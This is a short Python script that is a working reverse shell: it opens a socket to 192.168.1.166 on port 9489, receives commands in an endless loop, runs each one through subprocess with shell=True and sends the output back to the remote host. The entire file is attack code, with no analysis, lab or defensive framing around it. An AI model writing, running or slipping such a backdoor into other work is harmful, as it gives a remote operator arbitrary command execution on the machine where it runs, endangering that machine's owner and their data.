import socket
import sys
import time
import os
import getpass
import subprocess

s = socket.socket()
s.connect(('192.168.1.166',9489))

while True:
    data = s.recv(1024)
    try:
        output = subprocess.check_output(data,shell=True)
        s.send(output)
    except:
        s.send('No Command Found')
